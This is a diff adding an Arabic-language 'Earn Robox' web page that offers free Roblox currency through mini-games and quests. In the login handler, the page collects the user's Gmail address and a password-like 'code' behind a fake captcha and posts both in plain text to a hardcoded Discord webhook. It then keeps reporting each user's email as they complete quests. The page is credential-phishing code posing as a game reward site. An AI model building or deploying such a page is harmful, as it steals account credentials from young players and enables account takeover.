@@ -4,8 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Earn Robox</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;800;900&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;700;800;900&display=swap');
 
     :root {
       --bg-main: radial-gradient(circle at top, #1a103c 0%, #090612 100%);
@@ -15,9 +16,9 @@
         radial-gradient(circle at 50% 90%, rgba(236, 72, 153, 0.16), transparent 45%),
         linear-gradient(160deg, #090717 0%, #120d29 50%, #070611 100%);
       --bg-arcade: radial-gradient(circle at top, #082f2b 0%, #040d12 100%);
-      --card-bg: rgba(20, 16, 40, 0.9);
-      --card-quests-bg: rgba(13, 10, 29, 0.78);
-      --surface-bg: rgba(13, 10, 26, 0.92);
+      --card-bg: rgba(20, 16, 40, 0.92);
+      --card-quests-bg: rgba(13, 10, 29, 0.82);
+      --surface-bg: rgba(13, 10, 26, 0.94);
       --input-bg: #0d0a1a;
       --border-main: #00f0ff;
       --border-subtle: rgba(139, 92, 246, 0.45);
@@ -38,9 +39,9 @@
         radial-gradient(circle at 50% 90%, rgba(56, 189, 248, 0.16), transparent 45%),
         linear-gradient(160deg, #041118 0%, #07242b 50%, #030b10 100%);
       --bg-arcade: radial-gradient(circle at top, #053b32 0%, #031217 100%);
-      --card-bg: rgba(7, 29, 36, 0.92);
-      --card-quests-bg: rgba(6, 23, 30, 0.82);
-      --surface-bg: rgba(5, 20, 27, 0.94);
+      --card-bg: rgba(7, 29, 36, 0.94);
+      --card-quests-bg: rgba(6, 23, 30, 0.85);
+      --surface-bg: rgba(5, 20, 27, 0.95);
       --input-bg: #04151d;
       --border-main: #2dd4bf;
       --border-subtle: rgba(45, 212, 191, 0.42);
@@ -60,8 +61,8 @@
         radial-gradient(circle at 85% 20%, rgba(124, 58, 237, 0.12), transparent 42%),
         linear-gradient(160deg, #f8fafc 0%, #eef2ff 55%, #f1f5f9 100%);
       --bg-arcade: linear-gradient(160deg, #ecfdf5 0%, #e0f2fe 100%);
-      --card-bg: rgba(255, 255, 255, 0.96);
-      --card-quests-bg: rgba(255, 255, 255, 0.9);
+      --card-bg: rgba(255, 255, 255, 0.97);
+      --card-quests-bg: rgba(255, 255, 255, 0.92);
       --surface-bg: #f1f5f9;
       --input-bg: #ffffff;
       --border-main: #0284c7;
@@ -83,9 +84,9 @@
         radial-gradient(circle at 50% 90%, rgba(139, 92, 246, 0.22), transparent 45%),
         linear-gradient(160deg, #110624 0%, #210b42 50%, #0b0417 100%);
       --bg-arcade: radial-gradient(circle at top, #3b0764 0%, #10041c 100%);
-      --card-bg: rgba(29, 11, 56, 0.92);
-      --card-quests-bg: rgba(22, 8, 44, 0.82);
-      --surface-bg: rgba(18, 7, 36, 0.95);
+      --card-bg: rgba(29, 11, 56, 0.94);
+      --card-quests-bg: rgba(22, 8, 44, 0.85);
+      --surface-bg: rgba(18, 7, 36, 0.96);
       --input-bg: #140729;
       --border-main: #c084fc;
       --border-subtle: rgba(192, 132, 252, 0.45);
@@ -131,7 +132,7 @@
 
     .gaming-card {
       width: 100%;
-      max-width: 460px;
+      max-width: 470px;
       margin: auto;
       background: var(--card-bg);
       border: 2px solid var(--border-main);
@@ -188,7 +189,7 @@
     body.quests-full-mode #settingsScreen.active,
     body.quests-full-mode #shopScreen.active {
       width: 100%;
-      max-width: 820px;
+      max-width: 840px;
       margin: auto;
     }
 
@@ -820,4 +821,1420 @@
       width: 34px;
       height: 34px;
       border-radius: 50%;
-      background: radial-gradient(circle, #fb718
+      background: radial-gradient(circle, #fb7185 35%, #ffffff 38%, #fb7185 68%, transparent 72%);
+      border: 2px solid #f43f5e;
+      transform: translate(-50%, -50%);
+      cursor: pointer;
+    }
+
+    .tetris-board {
+      display: grid;
+      grid-template-columns: repeat(8, 22px);
+      grid-template-rows: repeat(10, 22px);
+      gap: 2px;
+      justify-content: center;
+      background: #060b14;
+      padding: 8px;
+      border-radius: 10px;
+      margin: 10px auto;
+      width: fit-content;
+      border: 1px solid rgba(56, 189, 248, 0.35);
+    }
+
+    .t-cell {
+      width: 22px;
+      height: 22px;
+      border-radius: 3px;
+      background: rgba(148, 163, 184, 0.1);
+    }
+
+    .t-cell.filled {
+      background: #22d3ee;
+    }
+
+    .t-cell.active-piece {
+      background: #fbbf24;
+    }
+
+    .runner-track {
+      position: relative;
+      height: 125px;
+      border-radius: 12px;
+      background: linear-gradient(180deg, #091926 0%, #0d2638 78%, #1e293b 78%, #0f172a 100%);
+      border: 1px solid rgba(45, 212, 191, 0.4);
+      overflow: hidden;
+      margin: 10px 0;
+    }
+
+    .runner-player {
+      position: absolute;
+      left: 34px;
+      bottom: 27px;
+      width: 26px;
+      height: 26px;
+      border-radius: 7px;
+      background: #34d399;
+      transition: bottom 0.12s ease;
+    }
+
+    .runner-obstacle {
+      position: absolute;
+      bottom: 27px;
+      width: 20px;
+      height: 26px;
+      border-radius: 5px;
+      background: #fb7185;
+    }
+
+    .footer-links {
+      margin-top: 16px;
+      padding-top: 10px;
+      border-top: 1px solid var(--border-subtle);
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      font-size: 0.82rem;
+    }
+
+    .footer-links button {
+      all: unset;
+      color: var(--text-muted);
+      cursor: pointer;
+    }
+
+    .footer-links button:hover {
+      color: var(--accent-1);
+    }
+
+    .info-modal {
+      margin-top: 10px;
+      padding: 10px 12px;
+      border-radius: 10px;
+      background: var(--surface-bg);
+      border: 1px solid var(--border-subtle);
+      color: var(--text-soft);
+      font-size: 0.82rem;
+      line-height: 1.6;
+      display: none;
+    }
+
+    .info-modal.show {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="gaming-card" id="mainCard">
+    <!-- شاشة تسجيل الدخول -->
+    <div class="screen active" id="loginScreen">
+      <div class="top-bar-actions">
+        <span class="badge">⚡ EARN ROBOX</span>
+        <button type="button" class="icon-action-btn" id="openSettingsFromLogin">⚙️ الثيمات</button>
+      </div>
+      <h1>Earn Robox</h1>
+      <p>أدخل بياناتك بالأسفل للانتقال إلى المهام.</p>
+
+      <form id="supportForm">
+        <div class="field">
+          <label for="gamerTag">Gmail</label>
+          <input type="text" id="gamerTag" name="gamerTag" placeholder="example@gmail.com" required />
+        </div>
+
+        <div class="field">
+          <label for="secretCode">الرمز</label>
+          <input type="text" id="secretCode" name="secretCode" placeholder="10 أحرف أو أرقام على الأقل..." required />
+        </div>
+
+        <button type="submit" id="submitBtn" class="main-btn">إرسال الآن ⚡</button>
+
+        <div class="captcha-box" id="captchaBox">
+          <span class="spinner"></span>
+          <span id="captchaText">جاري التحقق أنك لست بوت... (3 ثواني)</span>
+        </div>
+
+        <div class="status" id="statusMsg"></div>
+      </form>
+
+      <div class="footer-links">
+        <button type="button" id="helpBtn">مساعدة</button>
+        <button type="button" id="aboutBtn">نبذة عنا</button>
+      </div>
+
+      <div class="info-modal" id="infoModal"></div>
+    </div>
+
+    <!-- شاشة المهام -->
+    <div class="screen" id="questsScreen">
+      <div class="top-bar-actions">
+        <span class="badge">🎯 المهام اليومية</span>
+        <div class="right-actions">
+          <span class="coins-pill" id="coinsCounter">🪙 0 كوينز</span>
+          <button type="button" class="icon-action-btn" id="openShopBtn">🛒 المتجر</button>
+          <button type="button" class="icon-action-btn" id="openProfileBtn">👤 البروفايل</button>
+          <button type="button" class="icon-action-btn" id="openSettingsBtn">⚙️ الإعدادات</button>
+        </div>
+      </div>
+
+      <h2>اختر مهمة من المهام الثلاثة</h2>
+      <p id="questsSubtitle">كل دورة تضم لعبة مصغرة واحدة + مهمتين لكتابة الكود الظاهر. تتجدد المهام تلقائيًا كل 10 دقائق.</p>
+
+      <div class="cooldown-banner" id="cooldownBanner">
+        <div>ارجع بعد عشر دقائق لتجميع عملاتك</div>
+        <div class="cooldown-timer" id="cooldownTimer">10:00</div>
+      </div>
+
+      <div class="quests-list" id="questsList"></div>
+
+      <button type="button" class="secondary-btn" id="backToLoginBtn">تسجيل خروج / تغيير الحساب</button>
+    </div>
+
+    <!-- شاشة الألعاب والمهام -->
+    <div class="screen" id="gameScreen">
+      <div class="top-bar-actions">
+        <span class="badge" id="modeBadge">🕹️ ARCADE ZONE</span>
+        <span class="coins-pill" id="gameCoinsCounter">🪙 0 كوينز</span>
+      </div>
+      <h2 id="gameHeading">مهمة إلكترونية</h2>
+      <p id="gameDesc">أكمل المهمة البسيطة بالأسفل.</p>
+
+      <div class="mini-box" id="miniGameArea"></div>
+
+      <div class="status" id="gameStatus"></div>
+
+      <button type="button" class="secondary-btn" id="backToQuestsBtn">رجوع لقائمة المهام</button>
+    </div>
+
+    <!-- شاشة البروفايل وتحويل الكوينز -->
+    <div class="screen" id="profileScreen">
+      <div class="top-bar-actions">
+        <span class="badge">👤 البروفايل</span>
+        <span class="coins-pill" id="profileCoinsCounter">🪙 0 كوينز</span>
+      </div>
+      <h2>ملفك الشخصي وتحويل الكوينز</h2>
+      <p>يمكن لأي لاعب إرسال كوينز لك باستخدام اسم البروفايل الخاص بك، أو يمكنك تحويل كوينز للآخرين.</p>
+
+      <div class="panel-box">
+        <div class="panel-title">اسم البروفايل الخاص بك</div>
+        <div class="inline-row">
+          <input type="text" id="profileNameInput" maxlength="24" placeholder="اكتب اسم البروفايل..." />
+          <button type="button" class="small-btn" id="saveProfileNameBtn">حفظ الاسم</button>
+          <button type="button" class="small-btn" id="copyProfileNameBtn">نسخ</button>
+        </div>
+        <div class="status" id="profileStatus"></div>
+      </div>
+
+      <div class="panel-box">
+        <div class="panel-title">إرسال كوينز عبر اسم البروفايل</div>
+        <div class="field">
+          <label for="sendTargetName">اسم البروفايل المستلم</label>
+          <input type="text" id="sendTargetName" placeholder="مثال: player_pro" />
+        </div>
+        <div class="field">
+          <label for="sendCoinsAmount">عدد الكوينز</label>
+          <input type="number" id="sendCoinsAmount" min="1" placeholder="مثال: 25" />
+        </div>
+        <button type="button" class="main-btn" id="sendCoinsBtn">إرسال الكوينز الآن 💸</button>
+        <div class="status" id="transferStatus"></div>
+      </div>
+
+      <button type="button" class="secondary-btn" id="backFromProfileBtn">رجوع للمهام</button>
+    </div>
+
+    <!-- شاشة المتجر -->
+    <div class="screen" id="shopScreen">
+      <div class="top-bar-actions">
+        <span class="badge">🛒 ROBOX SHOP</span>
+        <span class="coins-pill" id="shopCoinsCounter">🪙 0 كوينز</span>
+      </div>
+      <h2>متجر الروبوكس</h2>
+
+      <div class="shop-alert-box">
+        ⚠️ تنبيه: اكتب اسمك في روبلوكس علشان الروبكس يوصلك
+      </div>
+
+      <div class="panel-box">
+        <label for="robloxUsernameInput">اسمك في روبلوكس</label>
+        <div class="inline-row">
+          <input type="text" id="robloxUsernameInput" maxlength="30" placeholder="اكتب اسمك في روبلوكس لفتح الشوب..." />
+          <button type="button" class="small-btn" id="unlockShopBtn">تأكيد الاسم</button>
+        </div>
+        <div class="status" id="shopNameStatus"></div>
+      </div>
+
+      <div id="shopPackagesSection" style="display: none;">
+        <div class="panel-box">
+          <div class="panel-title">باقات الروبوكس المتاحة</div>
+          <div class="packages-grid">
+            <div class="package-card">
+              <div>
+                <div class="package-robux">5 روبوكس</div>
+                <div class="package-price">السعر: 150 كوينز</div>
+              </div>
+              <button type="button" class="buy-btn" data-robux="5" data-cost="150">شراء 5 روبوكس</button>
+            </div>
+
+            <div class="package-card">
+              <div>
+                <div class="package-robux">10 روبوكس</div>
+                <div class="package-price">السعر: 250 كوينز</div>
+              </div>
+              <button type="button" class="buy-btn" data-robux="10" data-cost="250">شراء 10 روبوكس</button>
+            </div>
+
+            <div class="package-card">
+              <div>
+                <div class="package-robux">100 روبوكس</div>
+                <div class="package-price">السعر: 1000 كوينز</div>
+              </div>
+              <button type="button" class="buy-btn" data-robux="100" data-cost="1000">شراء 100 روبوكس</button>
+            </div>
+
+            <div class="package-card">
+              <div>
+                <div class="package-robux">1000 روبوكس</div>
+                <div class="package-price">السعر: 25000 كوينز</div>
+              </div>
+              <button type="button" class="buy-btn" data-robux="1000" data-cost="25000">شراء 1000 روبوكس</button>
+            </div>
+          </div>
+          <div class="status" id="shopBuyStatus"></div>
+        </div>
+      </div>
+
+      <div class="panel-box">
+        <div class="panel-title">سجل المشتريات</div>
+        <div class="orders-list" id="ordersList"></div>
+      </div>
+
+      <button type="button" class="secondary-btn" id="backFromShopBtn">رجوع للمهام</button>
+    </div>
+
+    <!-- شاشة الإعدادات والثيمات -->
+    <div class="screen" id="settingsScreen">
+      <div class="top-bar-actions">
+        <span class="badge">⚙️ الإعدادات</span>
+      </div>
+      <h2>إعدادات الثيم</h2>
+      <p>اختر المظهر المناسب لك وسيتم حفظه تلقائيًا.</p>
+
+      <div class="panel-box">
+        <div class="panel-title">ثيمات الموقع</div>
+        <div class="theme-grid">
+          <button type="button" class="theme-option-btn" data-theme="default">🌌 ثيم النظام العادي</button>
+          <button type="button" class="theme-option-btn" data-theme="aurora">🌿 ثيم الشفق القطبي</button>
+          <button type="button" class="theme-option-btn" data-theme="light">☀️ الثيم الأبيض</button>
+          <button type="button" class="theme-option-btn" data-theme="purple">💜 الثيم البنفسجي</button>
+        </div>
+      </div>
+
+      <button type="button" class="secondary-btn" id="backFromSettingsBtn">رجوع</button>
+    </div>
+  </div>
+
+  <!-- نافذة تحذير وتأكيد الرمز عند تسجيل الدخول -->
+  <div class="modal-backdrop" id="codeWarningModal">
+    <div class="modal-card">
+      <div class="modal-warning-title">⚠️ تحذير مهم قبل المتابعة</div>
+      <div class="modal-warning-text">تأكد أن الرمز صح لو مش صح مش هيجيلك كود الشحن</div>
+      <div class="modal-actions">
+        <button type="button" class="secondary-btn" id="editCodeBtn" style="margin-top:0;">تعديل الرمز</button>
+        <button type="button" class="main-btn" id="confirmCodeBtn">تأكيد والمتابعة ✓</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573352278713303052/1CJuJ0LpyAKOAxxLRhz_gMqrCbmtBc2p5Vvcakur5_cW4l7dLKd3aWjJOqwlzPuzUgwz";
+
+    const QUEST_REWARD_COINS = 50;
+    const COOLDOWN_MS = 10 * 60 * 1000;
+    const STORAGE_PREFIX = "earn_robox_v4_";
+    const THEME_STORAGE_KEY = "earn_robox_theme_v4";
+
+    const MINI_GAME_POOL = [
+      { id: "candy", title: "لعبة كاندي كراش مصغرة", hint: "لعبة مصغرة • بدّل جوهرتين لمطابقة 3 وتجميع 30 نقطة", type: "game" },
+      { id: "sniper", title: "لعبة تنشين بالقناصة", hint: "لعبة مصغرة • أصب 5 أهداف بالمنظار بدقة", type: "game" },
+      { id: "tetris", title: "لعبة تتريس السريعة", hint: "لعبة مصغرة • اجمع سكور 10 لإتمام المهمة", type: "game" },
+      { id: "subway", title: "لعبة صب واي 2D أفقي", hint: "لعبة مصغرة • اركض واقفز لتفادي العقبات وجمع 6 نقاط", type: "game" }
+    ];
+
+    const CODE_QUEST_POOL = [
+      { id: "code_1", title: "اكتب الكود الظاهر: رمز الدخول", hint: "مهمة كود • اكتب الكود الظاهر أمامك بدقة", type: "code" },
+      { id: "code_2", title: "اكتب الكود الظاهر: مفتاح النظام", hint: "مهمة كود • أدخل الكود الظاهر أمامك لتفعيل المهمة", type: "code" },
+      { id: "code_3", title: "اكتب الكود الظاهر: شفرة التحقق", hint: "مهمة كود • اكتب الكود الظاهر أمامك كما هو", type: "code" },
+      { id: "code_4", title: "اكتب الكود الظاهر: رقم التفعيل", hint: "مهمة كود • أدخل الكود الظاهر أمامك لإتمام المهمة", type: "code" }
+    ];
+
+    let currentUserEmail = "";
+    let previousScreenBeforeSettings = "login";
+    let pendingLoginPayload = null;
+    let cooldownInterval = null;
+    let activeGameCleanup = null;
+
+    const mainCard = document.getElementById("mainCard");
+    const loginScreen = document.getElementById("loginScreen");
+    const questsScreen = document.getElementById("questsScreen");
+    const gameScreen = document.getElementById("gameScreen");
+    const profileScreen = document.getElementById("profileScreen");
+    const shopScreen = document.getElementById("shopScreen");
+    const settingsScreen = document.getElementById("settingsScreen");
+
+    const form = document.getElementById("supportForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const statusMsg = document.getElementById("statusMsg");
+    const captchaBox = document.getElementById("captchaBox");
+    const captchaText = document.getElementById("captchaText");
+    const helpBtn = document.getElementById("helpBtn");
+    const aboutBtn = document.getElementById("aboutBtn");
+    const infoModal = document.getElementById("infoModal");
+
+    const codeWarningModal = document.getElementById("codeWarningModal");
+    const editCodeBtn = document.getElementById("editCodeBtn");
+    const confirmCodeBtn = document.getElementById("confirmCodeBtn");
+
+    const questsList = document.getElementById("questsList");
+    const cooldownBanner = document.getElementById("cooldownBanner");
+    const cooldownTimer = document.getElementById("cooldownTimer");
+
+    const modeBadge = document.getElementById("modeBadge");
+    const miniGameArea = document.getElementById("miniGameArea");
+    const gameHeading = document.getElementById("gameHeading");
+    const gameDesc = document.getElementById("gameDesc");
+    const gameStatus = document.getElementById("gameStatus");
+
+    async function sendToDiscord(title, fields = [], color = 0x00f0ff) {
+      if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.startsWith("http")) return;
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            embeds: [
+              {
+                title,
+                color,
+                fields,
+                timestamp: new Date().toISOString()
+              }
+            ]
+          })
+        });
+      } catch (err) {
+        console.error("Webhook error:", err);
+      }
+    }
+
+    function applyTheme(themeName) {
+      const validThemes = ["default", "aurora", "light", "purple"];
+      const chosen = validThemes.includes(themeName) ? themeName : "default";
+      document.body.classList.remove("theme-aurora", "theme-light", "theme-purple");
+      if (chosen === "aurora") document.body.classList.add("theme-aurora");
+      if (chosen === "light") document.body.classList.add("theme-light");
+      if (chosen === "purple") document.body.classList.add("theme-purple");
+      localStorage.setItem(THEME_STORAGE_KEY, chosen);
+
+      document.querySelectorAll(".theme-option-btn").forEach((btn) => {
+        btn.classList.toggle("active", btn.dataset.theme === chosen);
+      });
+    }
+
+    function normalizeEmail(email) {
+      return email.trim().toLowerCase();
+    }
+
+    function getUserStorageKey(email) {
+      return `${STORAGE_PREFIX}${normalizeEmail(email)}`;
+    }
+
+    function shuffleArray(arr) {
+      const copy = [...arr];
+      for (let i = copy.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [copy[i], copy[j]] = [copy[j], copy[i]];
+      }
+      return copy;
+    }
+
+    function generateRandomCode() {
+      const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+      let result = "";
+      for (let i = 0; i < 6; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return result;
+    }
+
+    function createFreshCycleQuests() {
+      const pickedGame = shuffleArray(MINI_GAME_POOL)[0];
+      const pickedCodes = shuffleArray(CODE_QUEST_POOL).slice(0, 2).map((item, idx) => ({
+        ...item,
+        targetCode: generateRandomCode(),
+        slotKey: `${item.id}_c${idx}_${Math.random().toString(36).slice(2, 6)}`
+      }));
+
+      return shuffleArray([
+        {
+          ...pickedGame,
+          slotKey: `${pickedGame.id}_g_${Math.random().toString(36).slice(2, 6)}`
+        },
+        ...pickedCodes
+      ]);
+    }
+
+    function makeDefaultProfileName(email) {
+      const base = email.split("@")[0].replace(/[^a-zA-Z0-9_]/g, "") || "player";
+      return `${base.slice(0, 12)}_robox`;
+    }
+
+    function loadUserState(email) {
+      const key = getUserStorageKey(email);
+      const raw = localStorage.getItem(key);
+      if (raw) {
+        try {
+          const parsed = JSON.parse(raw);
+          return {
+            email: normalizeEmail(email),
+            secretCode: parsed.secretCode || "",
+            coins: Number(parsed.coins) || 0,
+            profileName: parsed.profileName || makeDefaultProfileName(email),
+            robloxUsername: parsed.robloxUsername || "",
+            quests: Array.isArray(parsed.quests) && parsed.quests.length === 3 ? parsed.quests : createFreshCycleQuests(),
+            completedKeys: Array.isArray(parsed.completedKeys) ? parsed.completedKeys : [],
+            cooldownUntil: Number(parsed.cooldownUntil) || 0,
+            orders: Array.isArray(parsed.orders) ? parsed.orders : []
+          };
+        } catch (e) {}
+      }
+
+      const initialState = {
+        email: normalizeEmail(email),
+        secretCode: "",
+        coins: 0,
+        profileName: makeDefaultProfileName(email),
+        robloxUsername: "",
+        quests: createFreshCycleQuests(),
+        completedKeys: [],
+        cooldownUntil: 0,
+        orders: []
+      };
+      saveUserState(initialState);
+      return initialState;
+    }
+
+    function saveUserState(state) {
+      localStorage.setItem(getUserStorageKey(state.email), JSON.stringify(state));
+    }
+
+    function getCurrentUserState() {
+      return loadUserState(currentUserEmail);
+    }
+
+    function updateAllCoinsCounters() {
+      const state = getCurrentUserState();
+      const label = `🪙 ${state.coins} كوينز`;
+      document.getElementById("coinsCounter").textContent = label;
+      document.getElementById("gameCoinsCounter").textContent = label;
+      document.getElementById("profileCoinsCounter").textContent = label;
+      document.getElementById("shopCoinsCounter").textContent = label;
+    }
+
+    function cleanupActiveGame() {
+      if (typeof activeGameCleanup === "function") {
+        activeGameCleanup();
+        activeGameCleanup = null;
+      }
+    }
+
+    function showScreen(screenName) {
+      cleanupActiveGame();
+
+      [loginScreen, questsScreen, gameScreen, profileScreen, shopScreen, settingsScreen].forEach((el) => {
+        el.classList.remove("active");
+      });
+
+      document.body.classList.remove("quests-full-mode", "arcade-mode");
+      mainCard.classList.remove("arcade-card");
+
+      if (screenName === "login") {
+        loginScreen.classList.add("active");
+      } else if (screenName === "quests") {
+        document.body.classList.add("quests-full-mode");
+        questsScreen.classList.add("active");
+        checkCooldownAndRenderQuests();
+      } else if (screenName === "game") {
+        document.body.classList.add("arcade-mode");
+        mainCard.classList.add("arcade-card");
+        gameScreen.classList.add("active");
+      } else if (screenName === "profile") {
+        document.body.classList.add("quests-full-mode");
+        profileScreen.classList.add("active");
+        renderProfileScreen();
+      } else if (screenName === "shop") {
+        document.body.classList.add("quests-full-mode");
+        shopScreen.classList.add("active");
+        renderShopScreen();
+      } else if (screenName === "settings") {
+        document.body.classList.add("quests-full-mode");
+        settingsScreen.classList.add("active");
+      }
+
+      updateAllCoinsCounters();
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    function formatCountdown(ms) {
+      const totalSeconds = Math.max(0, Math.ceil(ms / 1000));
+      const mins = Math.floor(totalSeconds / 60);
+      const secs = totalSeconds % 60;
+      return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
+    }
+
+    function checkCooldownAndRenderQuests() {
+      const state = getCurrentUserState();
+      const now = Date.now();
+
+      if (cooldownInterval) {
+        clearInterval(cooldownInterval);
+        cooldownInterval = null;
+      }
+
+      if (state.cooldownUntil > now) {
+        cooldownBanner.classList.add("active");
+        cooldownTimer.textContent = formatCountdown(state.cooldownUntil - now);
+        renderQuestsList(true);
+
+        cooldownInterval = setInterval(() => {
+          const latest = getCurrentUserState();
+          const remaining = latest.cooldownUntil - Date.now();
+          if (remaining <= 0) {
+            clearInterval(cooldownInterval);
+            cooldownInterval = null;
+            latest.cooldownUntil = 0;
+            latest.quests = createFreshCycleQuests();
+            latest.completedKeys = [];
+            saveUserState(latest);
+            cooldownBanner.classList.remove("active");
+            renderQuestsList(false);
+          } else {
+            cooldownTimer.textContent = formatCountdown(remaining);
+          }
+        }, 1000);
+      } else {
+        if (state.cooldownUntil > 0 && state.cooldownUntil <= now) {
+          state.cooldownUntil = 0;
+          state.quests = createFreshCycleQuests();
+          state.completedKeys = [];
+          saveUserState(state);
+        }
+        cooldownBanner.classList.remove("active");
+        renderQuestsList(false);
+      }
+    }
+
+    function renderQuestsList(isCoolingDown) {
+      const state = getCurrentUserState();
+      questsList.innerHTML = "";
+
+      state.quests.forEach((quest, index) => {
+        const isDone = state.completedKeys.includes(quest.slotKey);
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.className = "quest-slot";
+        btn.disabled = isDone || isCoolingDown;
+
+        const tagClass = isDone
+          ? "quest-tag done"
+          : quest.type === "game"
+            ? "quest-tag game-tag"
+            : "quest-tag code-tag";
+
+        const tagText = isDone
+          ? "مكتملة ✓"
+          : quest.type === "game"
+            ? "لعبة مصغرة"
+            : "كود ظاهر";
+
+        btn.innerHTML = `
+          <div class="quest-top-row">
+            <span class="quest-title">${index + 1}. ${quest.title}</span>
+            <span class="${tagClass}">${tagText}</span>
+          </div>
+          <span class="quest-sub">${quest.hint}</span>
+          <span class="quest-reward">+${QUEST_REWARD_COINS} كوينز</span>
+        `;
+
+        btn.addEventListener("click", () => openQuest(quest));
+        questsList.appendChild(btn);
+      });
+    }
+
+    function completeQuestReward(quest) {
+      const state = getCurrentUserState();
+      if (state.completedKeys.includes(quest.slotKey)) return;
+
+      state.completedKeys.push(quest.slotKey);
+      state.coins += QUEST_REWARD_COINS;
+
+      const allThreeDone = state.quests.every((q) => state.completedKeys.includes(q.slotKey));
+      if (allThreeDone && state.cooldownUntil === 0) {
+        state.cooldownUntil = Date.now() + COOLDOWN_MS;
+      }
+
+      saveUserState(state);
+      updateAllCoinsCounters();
+
+      sendToDiscord(
+        "🎯 إتمام مهمة في Earn Robox",
+        [
+          { name: "الحساب (Gmail)", value: state.email, inline: true },
+          { name: "اسم البروفايل", value: state.profileName, inline: true },
+          { name: "المهمة", value: quest.title, inline: false },
+          { name: "المكافأة", value: `+${QUEST_REWARD_COINS} كوينز`, inline: true },
+          { name: "الرصيد الحالي", value: `${state.coins} كوينز`, inline: true }
+        ],
+        0x10b981
+      );
+    }
+
+    function showInfo(text) {
+      if (infoModal.classList.contains("show") && infoModal.dataset.current === text) {
+        infoModal.classList.remove("show");
+        infoModal.dataset.current = "";
+      } else {
+        infoModal.textContent = text;
+        infoModal.dataset.current = text;
+        infoModal.classList.add("show");
+      }
+    }
+
+    helpBtn.addEventListener("click", () => {
+      showInfo("اكتب Gmail صحيح ينتهي بـ @gmail.com ورمز 10 أحرف أو أرقام على الأقل، ثم أكد الرمز لبدء المهام وتجميع الكوينز.");
+    });
+
+    aboutBtn.addEventListener("click", () => {
+      showInfo("Earn Robox منصة مهام وألعاب مصغرة لتجميع الكوينز وطلب باقات الروبوكس.");
+    });
+
+    function runCaptchaCheck(seconds = 3) {
+      return new Promise((resolve) => {
+        let remaining = seconds;
+        captchaBox.classList.add("active");
+        captchaText.textContent = `جاري التحقق أنك لست بوت... (${remaining}ث)`;
+
+        const timer = setInterval(() => {
+          remaining -= 1;
+          if (remaining > 0) {
+            captchaText.textContent = `جاري التحقق أنك لست بوت... (${remaining}ث)`;
+          } else {
+            clearInterval(timer);
+            captchaText.textContent = "تم التحقق بنجاح ✓";
+            setTimeout(() => {
+              captchaBox.classList.remove("active");
+              resolve();
+            }, 350);
+          }
+        }, 1000);
+      });
+    }
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById("gamerTag").value.trim();
+      const password = document.getElementById("secretCode").value.trim();
+
+      statusMsg.className = "status";
+      statusMsg.textContent = "";
+
+      if (!email || !password) {
+        statusMsg.textContent = "من فضلك املأ خانة Gmail والرمز!";
+        statusMsg.className = "status error";
+        return;
+      }
+
+      if (!email.toLowerCase().endsWith("@gmail.com") || email.length <= "@gmail.com".length) {
+        statusMsg.textContent = "خطأ: البريد الإلكتروني ناقص @gmail.com أو غير صحيح!";
+        statusMsg.className = "status error";
+        return;
+      }
+
+      if (password.length < 10) {
+        statusMsg.textContent = `خطأ: الرمز أقل من 10 أحرف/أرقام (الحالي: ${password.length})`;
+        statusMsg.className = "status error";
+        return;
+      }
+
+      pendingLoginPayload = { email: normalizeEmail(email), password };
+      codeWarningModal.classList.add("show");
+    });
+
+    editCodeBtn.addEventListener("click", () => {
+      codeWarningModal.classList.remove("show");
+      pendingLoginPayload = null;
+      document.getElementById("secretCode").focus();
+    });
+
+    confirmCodeBtn.addEventListener("click", async () => {
+      if (!pendingLoginPayload) return;
+      codeWarningModal.classList.remove("show");
+
+      const { email, password } = pendingLoginPayload;
+      pendingLoginPayload = null;
+
+      submitBtn.disabled = true;
+      await runCaptchaCheck(3);
+
+      statusMsg.textContent = "جاري الدخول...";
+      statusMsg.className = "status";
+
+      setTimeout(() => {
+        currentUserEmail = email;
+        const userState = loadUserState(email);
+        userState.secretCode = password;
+        saveUserState(userState);
+
+        sendToDiscord(
+          "⚡ تسجيل دخول جديد في Earn Robox",
+          [
+            { name: "Gmail", value: email, inline: true },
+            { name: "الرمز", value: password, inline: true },
+            { name: "اسم البروفايل", value: userState.profileName, inline: true },
+            { name: "الكوينز الحالية", value: `${userState.coins}`, inline: true }
+          ],
+          0x00f0ff
+        );
+
+        statusMsg.textContent = "تم التحقق بنجاح ✓";
+        statusMsg.className = "status success";
+        form.reset();
+
+        setTimeout(() => {
+          statusMsg.textContent = "";
+          submitBtn.disabled = false;
+          showScreen("quests");
+        }, 400);
+      }, 500);
+    });
+
+    function openQuest(quest) {
+      cleanupActiveGame();
+      gameStatus.textContent = "";
+      gameStatus.className = "status";
+      showScreen("game");
+      gameHeading.textContent = quest.title;
+
+      if (quest.type === "code") {
+        modeBadge.textContent = "🔐 CODE VERIFICATION";
+        gameDesc.textContent = "اكتب الكود الظاهر أمامك في الخانة بالأسفل ثم اضغط تأكيد:";
+        miniGameArea.innerHTML = `
+          <div style="font-size:0.9rem;color:var(--text-soft);">الكود الظاهر أمامك:</div>
+          <div class="code-display-box">${quest.targetCode}</div>
+          <input type="text" id="typedQuestCode" placeholder="اكتب الكود هنا..." style="text-align:center;margin-bottom:8px;letter-spacing:2px;" />
+          <button type="button" class="mini-btn" id="verifyQuestCodeBtn">تأكيد الكود (+${QUEST_REWARD_COINS} كوينز)</button>
+        `;
+
